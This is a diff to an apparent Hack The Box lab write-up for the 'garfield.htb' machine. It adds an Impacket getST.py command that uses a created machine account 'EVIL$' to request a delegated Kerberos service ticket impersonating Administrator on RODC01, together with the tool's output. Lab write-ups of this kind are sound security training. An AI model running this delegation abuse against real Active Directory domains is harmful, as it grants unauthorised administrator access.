@@ -448,7 +448,21 @@ Ill then select the new session, add the new interface and add the routing info 
 I can now ping the device
 
 ```python
-❯❯❯ getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate "Administrator" -dc-ip "192.168.100.2" 'garfield.htb/l.wilson_adm:Password123!'
+❯❯❯ faketime -f +8h getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate "Administrator" -dc-ip "10.129.86.27" 'garfield.htb'/'EVIL$':'Password123!'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
+```
+
+I can then request a ticket, this should give me admin access on the `RODC01` machine
+
+```python
+
 ```
 
 
